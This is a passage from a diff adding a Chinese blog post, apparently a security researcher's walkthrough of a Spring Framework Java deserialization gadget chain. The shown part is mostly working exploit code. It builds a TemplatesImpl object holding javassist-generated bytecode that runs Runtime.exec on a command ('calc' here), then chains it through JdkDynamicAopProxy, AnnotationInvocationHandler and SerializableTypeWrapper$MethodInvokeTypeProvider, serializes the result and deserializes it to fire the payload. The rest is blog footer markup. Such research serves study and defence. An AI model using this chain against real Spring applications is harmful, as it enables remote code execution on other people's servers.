Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor1 = jdkdynamicaopproxyclazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkdynamicaopproxy</span> <span class="operator">=</span> (InvocationHandler)constructor1.newInstance(advisedsupport);</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates1</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                jdkdynamicaopproxy</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        templates1.newTransformer();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>我们把MethodInvokeTypeProvider反序列化入口加上</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;genPayload(<span class="string">&quot;calc&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">TransformerFactory</span> <span class="variable">factory1</span> <span class="operator">=</span> TransformerFactory.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, factory1);</span><br><span class="line"></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedsupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedsupport.setTarget(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">jdkdynamicaopproxyclazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor1 = jdkdynamicaopproxyclazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkdynamicaopproxy</span> <span class="operator">=</span> (InvocationHandler)constructor1.newInstance(advisedsupport);</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates1</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class,Type.class&#125;,</span><br><span class="line">                jdkdynamicaopproxy</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates1.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerclazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = annotationInvocationHandlerclazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;getType&quot;</span>,templates1);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,map1);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">TypeProviderclass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TypeProvider</span> <span class="operator">=</span> Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TypeProviderclass&#125;,</span><br><span class="line">                handler1</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">MethodInvokeTypeProviderclass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor3</span> <span class="operator">=</span> MethodInvokeTypeProviderclass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">MethodInvokeTypeProvider</span> <span class="operator">=</span> constructor3.newInstance(TypeProvider,Object.class.getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        setValue(MethodInvokeTypeProvider, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ser(MethodInvokeTypeProvider);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE2"><span class="toc-number">1.</span> <span class="toc-text">Spring反序列化链2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdkDynamicAopProxy"><span class="toc-number">1.2.</span> <span class="toc-text">JdkDynamicAopProxy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#target%E8%B5%8B%E5%80%BC"><span class="toc-number">1.2.1.</span> <span class="toc-text">target赋值</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">尝试失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%88%90%E5%8A%9F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">尝试成功</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.3.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">实现</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&text=Spring2反序列化链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&is_video=false&description=Spring2反序列化链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring2反序列化链&body=Check out this article: http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&name=Spring2反序列化链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&t=Spring2反序列化链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    Mouri-Kogorou
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
